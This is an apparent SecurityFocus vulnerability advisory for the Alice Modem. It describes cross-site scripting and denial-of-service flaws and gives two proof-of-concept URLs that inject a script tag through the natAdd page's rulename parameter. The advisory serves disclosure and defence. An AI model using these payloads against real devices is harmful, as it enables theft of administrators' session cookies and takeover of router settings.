source: https://www.securityfocus.com/bid/48642/info

The Alice Modem is prone to a cross-site scripting vulnerability and a denial-of-service vulnerability because the device fails to properly handle user-supplied input.

An attacker may leverage these issues to cause a denial-of-service condition or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. Successfully exploiting the cross-site scripting issue may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 

http://www.example.com/natAdd?apptype=userdefined&rulename=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&waninterface=ipwan&inthostip1=192&inthostip2=168&inthostip3=1&inthostip4=99


http://www.example.com/natAdd?apptype=userdefined&rulename=%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%3Cx+y=&waninterface=ipwan&inthostip1=192&inthostip2=168&inthostip3=1&inthostip4=199&protocol1=proto_6&extportstart1=1&extportend1=1&intportstart1=1&intportend1=1&protocol2=proto_6&extportstart2=&extportend2=&intportstart2=&intportend2=&protocol3=proto_6&extportstart3=&extportend3=&intportstart3=&intportend3=